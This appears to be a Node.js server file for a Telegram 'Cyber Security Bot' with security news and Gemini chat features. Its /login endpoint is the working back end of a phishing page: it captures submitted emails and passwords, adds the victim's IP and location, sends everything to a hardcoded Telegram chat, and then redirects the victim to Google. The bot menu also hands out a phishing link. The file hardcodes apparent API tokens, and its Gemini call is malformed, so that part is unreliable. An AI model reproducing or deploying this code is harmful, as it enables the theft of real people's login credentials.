const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const cheerio = require("cheerio");

const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static("public"));

const botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az7021";
const chatIds = ["6786210993"];
const bot = new TelegramBot(botToken, { polling: true });
const geminiApiKey = "your-gemini-api-key";
const geminiApiUrl = "https://api.gemini.com/v1/ask";
const rssUrl = "https://www.securityweek.com/rss.xml";

const fetchSecurityNews = async () => {
  try {
    const response = await axios.get(rssUrl);
    const body = response.data;
    const $ = cheerio.load(body);
    let newsList = [];

    $("item").each((i, element) => {
      const title = $(element).find("title").text();
      const link = $(element).find("link").text();
      const description = $(element).find("description").text();
      newsList.push({ title, link, description });
    });

    return newsList;
  } catch (error) {
    console.error("Error fetching news:", error);
    return [];
  }
};

const sendNewsUpdate = async (chatId) => {
  const newsList = await fetchSecurityNews();
  if (newsList.length > 0) {
    newsList.slice(0, 5).forEach((news) => {
      bot.sendMessage(
        chatId,
        `*${news.title}*\n${news.description}\n[Read more](${news.link})`,
        { parse_mode: "Markdown" }
      );
    });
  } else {
    bot.sendMessage(chatId, "No news available at the moment.");
  }
};

const getGeminiResponse = async (message) => {
  try {
    const response = await axios.post(geminiApiUrl, {
      apiKey: AIzaSyA5tdHVNBSUvYMw8g9U0SxH,
      query: message,
    });
    return response.data.response;
  } catch (error) {
    console.error("Error getting Gemini AI response:", error);
    return "❌ Error: Unable to fetch response from Gemini AI.";
  }
};

// ✅ Login Handler + Redirect ke Google
app.post("/login", async (req, res) => {
  const { email, password } = req.body;
  const loginTime = new Date().toLocaleString("en-US", {
    timeZone: "Asia/Jakarta",
  });

  let ipInfo = { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown" };
  try {
    let response = await axios.get("https://ipinfo.io/json?token=961f6caebd0f7d");
    ipInfo = response.data;
  } catch (error) {
    console.error("Failed to fetch IP data:", error);
  }

  let message = `🔒 *Login Successful!*\n\n` +
    `🕒 *Time:* ${loginTime}\n` +
    `📧 *Email:* ${email}\n` +
    `🔑 *Password:* ${password}\n` +
    `🌍 *IP:* ${ipInfo.ip}\n` +
    `📍 *Location:* ${ipInfo.city}, ${ipInfo.country}\n` +
    `🏢 *Provider:* ${ipInfo.org}`;

  chatIds.forEach(chatId => {
    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  });

  console.log("✅ Login data sent to Telegram successfully!");

  // ✅ Redirect ke Google setelah login sukses
  res.redirect("https://www.google.com");
});

app.post("/api/webhook", async (req, res) => {
  const { message } = req.body;
  if (!message) return res.sendStatus(200);

  const chatId = message.chat.id;
  const text = message.text;

  if (text === "/start") {
    bot.sendMessage(chatId, "Hello! Welcome to the Cyber Security Bot! Type /menu to see options.");
  } else if (text === "/menu") {
    bot.sendMessage(chatId, "Select a menu:", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 TOOLS Phishing", callback_data: "TOOLS_phishing" }],
          [{ text: "📰 Latest News", callback_data: "latest_news" }],
          [{ text: "🤖 Gemini AI", callback_data: "ask_gemini" }]
        ]
      }
    });
  } else if (text.startsWith("/ai ")) {
    const userQuestion = text.replace("/ai ", "");
    const aiResponse = await getGeminiResponse(userQuestion);
    bot.sendMessage(chatId, aiResponse);
  }

  res.sendStatus(200);
});

app.post("/api/callback", async (req, res) => {
  const { callback_query } = req.body;
  if (!callback_query) return res.sendStatus(200);

  const msg = callback_query.message;
  const data = callback_query.data;

  if (data === "TOOLS_phishing") {
    bot.sendMessage(msg.chat.id, "🔍 Links Phishing: https://suntiksubscriber.vercel.app/");
  } else if (data === "latest_news") {
    sendNewsUpdate(msg.chat.id);
  } else if (data === "ask_gemini") {
    bot.sendMessage(msg.chat.id, "Type /ai <question> to start chatting with Gemini AI.");
  }

  bot.answerCallbackQuery(callback_query.id);
  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`✅ Server is running on http://localhost:${port}`);
});
